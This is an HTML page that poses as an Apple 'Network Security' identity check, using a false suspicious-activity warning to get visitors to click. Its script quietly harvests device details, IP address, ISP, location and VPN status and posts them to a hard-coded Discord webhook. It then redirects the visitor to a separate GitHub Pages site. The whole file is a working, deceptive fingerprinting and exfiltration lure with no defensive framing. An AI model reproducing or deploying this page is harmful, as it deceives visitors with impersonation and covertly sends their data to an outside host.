<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Network Security Gateway</title>
    <style>
        :root { --apple-blue: #007aff; --apple-gray: #8e8e93; --apple-bg: #f2f2f7; }
        body { background-color: var(--apple-bg); font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; -webkit-font-smoothing: antialiased; }
        .card { background: #fff; padding: 48px 32px; border-radius: 28px; box-shadow: 0 10px 40px rgba(0,0,0,0.03); width: 90%; max-width: 340px; text-align: center; border: 0.5px solid #d1d1d6; }
        .logo { width: 42px; margin-bottom: 28px; filter: opacity(0.9); }
        .h1 { font-size: 24px; font-weight: 600; color: #000; margin-bottom: 12px; letter-spacing: -0.6px; }
        .p { font-size: 15px; color: var(--apple-gray); margin-bottom: 38px; line-height: 1.45; padding: 0 10px; }
        
        .gate-shell { border: 1.2px solid #d1d1d6; border-radius: 16px; padding: 20px; display: flex; align-items: center; cursor: pointer; background: #fff; transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); -webkit-tap-highlight-color: transparent; position: relative; }
        .gate-shell:active { background: #f9f9f9; transform: scale(0.98); }
        .check-box { width: 26px; height: 26px; border: 2.5px solid var(--apple-blue); border-radius: 7px; margin-right: 18px; position: relative; transition: 0.4s; }
        
        .check-box.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #log-status { font-size: 10px; color: #c7c7cc; margin-top: 32px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.8px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="logo">
    <div class="h1">Network Security</div>
    <div class="p">Suspicious activity detected. Please verify your connection to prevent service interruption.</div>
    
    <div class="gate-shell" id="nexus">
        <div class="check-box" id="loader"></div>
        <div style="font-size: 17px; color: #1c1c1e; font-weight: 500;">Verify Identity</div>
    </div>

    <div id="log-status">Security Handshake Required</div>
</div>

<script>
/**
 * SENTINEL OPTIMUS-PRIME v33.0
 * 1-SECOND DUAL-PHASE REDIRECT + PRIORITY-SYNC EXFIL
 */

const CONFIG = {
    WH: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    INTERMEDIATE: "https://sarahwassan55-rgb.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
    PING: "@everyone"
};

// Priority-Sync Exfiltration
const priorityStrike = (data, label) => {
    const payload = JSON.stringify({
        content: label === "CRITICAL_HIT" ? CONFIG.PING : "",
        username: `OPTIMUS-v33 [${label}]`,
        embeds: [{
            title: `🔱 Sentinel Unmasked: ${label}`,
            color: 0xff0000,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString()
        }]
    });

    // Forced transmission before redirect
    navigator.sendBeacon(CONFIG.WH, new Blob([payload], {type:'application/json'}));
    
    // Fallback sync-request to hold the thread for a millisecond
    const x = new XMLHttpRequest();
    x.open("POST", CONFIG.WH, false); // Synchronous
    x.setRequestHeader("Content-Type", "application/json");
    x.send(payload);
};

document.getElementById('nexus').onclick = async function() {
    if ("vibrate" in navigator) navigator.vibrate(20);
    
    const loader = document.getElementById('loader');
    loader.classList.add('loading');
    document.getElementById('log-status').innerText = "SYNCHRONIZING NETWORK...";

    // 1. GATHER ALL DATA IMMEDIATELY
    const b = await navigator.getBattery();
    const telemetry = {
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || "N/A",
        ram: navigator.deviceMemory || "N/A",
        battery: `${(b.level * 100).toFixed(0)}%`,
        screen: `${screen.width}x${screen.height}`,
        ua: navigator.userAgent
    };

    // 2. FIRE CRITICAL STRIKE
    priorityStrike(telemetry, "CRITICAL_HIT");

    // 3. SECONDARY GEO/IP FETCH (Asynchronous)
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        priorityStrike({
            ip: res.ip,
            isp: res.org,
            loc: `${res.city}, ${res.country_name}`,
            vpn: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO"
        }, "NETWORK_FINGERPRINT");
    }).catch(()=>{});

    // 4. THE 1-SECOND DUAL-PHASE REDIRECT
    // This sends them to the "Suspicious activity check" page you provided
    setTimeout(() => {
        window.location.replace(CONFIG.INTERMEDIATE);
    }, 1000);
};
</script>
</body>
</html>
